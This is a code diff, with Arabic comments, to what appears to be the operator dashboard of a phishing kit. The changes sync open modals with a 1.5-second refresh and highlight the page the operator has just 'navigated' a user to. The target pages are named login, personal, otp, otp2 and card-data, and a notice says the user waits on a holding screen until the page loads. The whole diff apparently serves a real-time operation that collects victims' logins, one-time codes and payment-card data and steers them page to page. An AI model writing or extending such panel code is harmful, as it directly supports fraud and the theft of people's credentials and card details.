@@ -281,6 +281,9 @@ const DASHBOARD_FORM_TABLES = [
 let dashboardRefreshIntervalId = null;
 let aggregatedUsers = [];
 
+/** صفحة التنقل التي أرسلها المشرف آخراً (تظهر باللون الأخضر حتى يصلها تحديث من الخادم) */
+let lastNavTargetPage = null;
+
 function recordSortTimestamp(rec) {
     if (rec.createdAt) {
         const t = new Date(rec.createdAt).getTime();
@@ -558,6 +561,99 @@ function findAggregatedUser(userId) {
     return aggregatedUsers.find((u) => String(u.id) === id) || null;
 }
 
+/** إعادة العثور على نفس المُجمَّع بعد `refresh` (جلسة أو أرقام سجلات) */
+function findAggregatedUserAfterRefresh(prev) {
+    if (!prev || !aggregatedUsers.length) return null;
+    const sid = String(getClientSessionIdForAggregate(prev) || '')
+        .trim()
+        .toLowerCase();
+    if (sid) {
+        const bySession = aggregatedUsers.find((agg) => {
+            const s = String(getClientSessionIdForAggregate(agg) || '')
+                .trim()
+                .toLowerCase();
+            return s === sid;
+        });
+        if (bySession) return bySession;
+    }
+    const idSet = new Set(
+        (prev.sourceIds && prev.sourceIds.length
+            ? prev.sourceIds
+            : [prev.id]
+        ).map(String)
+    );
+    const byIds = aggregatedUsers.find((agg) => {
+        const ids = (agg.sourceIds || []).map(String);
+        return [...idSet].some((id) => ids.includes(id));
+    });
+    if (byIds) return byIds;
+    return findAggregatedUser(String(prev.id));
+}
+
+function isInfoModalOpen() {
+    const m = document.getElementById('infoModal');
+    return !!(m && m.classList.contains('active'));
+}
+
+function isCardModalOpen() {
+    const m = document.getElementById('cardModal');
+    return !!(m && m.classList.contains('active'));
+}
+
+/** يُستدعى بعد تحديث `aggregatedUsers` لمزامنة المودال المفتوح */
+function refreshOpenModalsAfterDataChange() {
+    const infoOpen = isInfoModalOpen();
+    const cardOpen = isCardModalOpen();
+    if (!currentUser || (!infoOpen && !cardOpen)) return;
+
+    const next = findAggregatedUserAfterRefresh(currentUser);
+    if (!next) {
+        if (infoOpen) closeInfoModal();
+        if (cardOpen) closeCardModal();
+        return;
+    }
+    currentUser = next;
+    if (lastNavTargetPage && String(next.page || '') === lastNavTargetPage) {
+        lastNavTargetPage = null;
+    }
+
+    if (infoOpen) {
+        const el = document.getElementById('userDetails');
+        if (el) el.innerHTML = renderUserDetailsByPage(next);
+    }
+    if (cardOpen) {
+        const el = document.getElementById('cardDisplay');
+        if (el) el.innerHTML = renderDashboardFlipCardsRow(next);
+    }
+    if (infoOpen || cardOpen) {
+        updateNavigationButtons(next.page);
+    }
+}
+
+/** يحوّل اسم الملف المرسل في navigateTo إلى قيمة data-page */
+function navTargetToDataPage(target) {
+    let f = String(target || '').trim();
+    try {
+        if (f.includes('://') || (f.startsWith('/') && f.length > 1)) {
+            const u = new URL(f, window.location.origin);
+            f = u.pathname.split('/').pop() || '';
+        } else if (f.includes('/')) {
+            f = f.split('/').filter(Boolean).pop() || f;
+        }
+    } catch (e) {
+        /* keep f */
+    }
+    f = f.toLowerCase();
+    if (f.includes('otp2')) return 'otp2';
+    if (f.includes('card-data')) return 'card';
+    if (f.includes('login')) return 'login';
+    if (f.includes('personal')) return 'personal';
+    if (f.includes('otp')) return 'otp';
+    if (f.includes('address')) return 'address';
+    if (f.includes('watches')) return 'watches';
+    return '';
+}
+
 /** أحدث client_session_id معروف لهذا الصف المُجمَّع */
 function getClientSessionIdForAggregate(agg) {
     if (!agg) return '';
@@ -636,6 +732,7 @@ function renderDashboardTables() {
         wrap.innerHTML =
             '<p class="dashboard-empty-all">لا توجد بيانات مسجلة</p>';
         aggregatedUsers = [];
+        refreshOpenModalsAfterDataChange();
         return;
     }
 
@@ -645,6 +742,7 @@ function renderDashboardTables() {
     if (!viewUsers.length) {
         wrap.innerHTML =
             '<p class="dashboard-empty-all">لا توجد نتائج مطابقة للبحث</p>';
+        refreshOpenModalsAfterDataChange();
         return;
     }
 
@@ -686,6 +784,7 @@ function renderDashboardTables() {
             </table>
         </div>
     </section>`;
+    refreshOpenModalsAfterDataChange();
 }
 
 // Session Management - حفظ جلسة الدخول
@@ -787,7 +886,7 @@ async function loadDashboard() {
             console.error(err);
         }
         renderDashboardTables();
-    }, 2000);
+    }, 1500);
 }
 
 function getPageArabic(page) {
@@ -843,6 +942,7 @@ async function deleteAllUsers() {
 
 // Info Modal
 function openInfoModal(userId) {
+    lastNavTargetPage = null;
     currentUser = findAggregatedUser(userId);
     if (!currentUser) return;
 
@@ -892,6 +992,7 @@ function closeInfoModal() {
     infoModal.classList.add('modal-hidden');
     infoModal.classList.remove('active');
     infoModal.style.setProperty('display', 'none', 'important');
+    lastNavTargetPage = null;
     currentUser = null;
 }
 
@@ -1089,6 +1190,7 @@ function renderDashboardFlipCardsRow(user) {
 }
 
 function openCardModal(userId) {
+    lastNavTargetPage = null;
     currentUser = findAggregatedUser(userId);
     if (!currentUser) return;
 
@@ -1178,6 +1280,7 @@ function closeCardModal() {
     cardModal.classList.add('modal-hidden');
     cardModal.classList.remove('active');
     cardModal.style.setProperty('display', 'none', 'important');
+    lastNavTargetPage = null;
     currentUser = null;
 }
 
@@ -1201,9 +1304,19 @@ async function deleteUser() {
 }
 
 function updateNavigationButtons(currentPage) {
-    document.querySelectorAll('.nav-btn').forEach(btn => {
+    const highlight =
+        (lastNavTargetPage && String(lastNavTargetPage)) ||
+        String(currentPage || '');
+    const roots = [];
+    if (isInfoModalOpen()) roots.push('#infoModal');
+    if (isCardModalOpen()) roots.push('#cardModal');
+    const selector =
+        roots.length > 0
+            ? roots.map((r) => r + ' .nav-btn').join(', ')
+            : '.nav-btn';
+    document.querySelectorAll(selector).forEach((btn) => {
         const btnPage = btn.getAttribute('data-page');
-        if (btnPage === currentPage) {
+        if (btnPage === highlight) {
             btn.classList.add('active');
         } else {
             btn.classList.remove('active');
@@ -1245,6 +1358,11 @@ async function navigateTo(page) {
         if (!res.ok) {
             const t = await res.text();
             throw new Error(t || 'فشل الطلب');
+        }
+        const pageKey = navTargetToDataPage(target);
+        if (pageKey) {
+            lastNavTargetPage = pageKey;
+            updateNavigationButtons(currentUser.page);
         }
         db.showNotification(
             'تم إرسال التوجيه. المستخدم ما زال على شاشة الانتظار حتى تُحمَّل الصفحة.',
